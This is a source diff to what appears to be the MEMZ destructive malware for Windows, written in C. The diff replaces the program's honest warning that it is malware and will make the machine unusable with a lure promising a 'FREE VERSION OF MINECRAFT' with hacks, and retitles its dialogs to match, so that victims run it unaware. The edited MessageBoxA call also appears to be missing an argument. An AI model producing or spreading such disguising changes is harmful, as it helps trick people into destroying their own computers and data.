@@ -46,15 +46,10 @@ void main() {
 		}
 	} else {
 		// Another very ugly formatting
-		if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
-This malware will harm your computer and makes it unusable.\r\n\
-If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
-If you know what this malware does and are using a safe environment to test, \
-press Yes to start it.\r\n\r\n\
-DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
+		if (MessageBoxA(NULL, "Hit yes for a FREE VERISON OF MINECRAFT ALSO YOU GET HACKS! ANY DAMAGE THAT THIS MIGHT DO TO YOU OR YOUR COMPUTER THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE!", MB_YESNO | MB_ICONWARNING) != IDYES ||
 MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
-THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
+THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS FREE VERSION OF MINECRAFT WE SUGGEST YOU USE VIRTUAL BOX AND GET WINDOWS ARE THERE.!\r\n\
+STILL EXECUTE IT?", "FREE VERSION OF MINECRAFT", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
 
@@ -309,7 +304,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 If you have productive data on your system or signed in to online accounts, it is recommended to run this payload inside a \
 virtual machine in order to prevent potential data loss or changed things you might not want.\r\n\r\n\
 Do you still want to enable it?",
-"MEMZ", MB_YESNO | MB_ICONWARNING) == IDYES) {
+"FREE VERSION MINECRAFT", MB_YESNO | MB_ICONWARNING) == IDYES) {
 						SendMessage((HWND)lParam, BM_SETCHECK, BST_CHECKED, NULL);
 					}
 				}
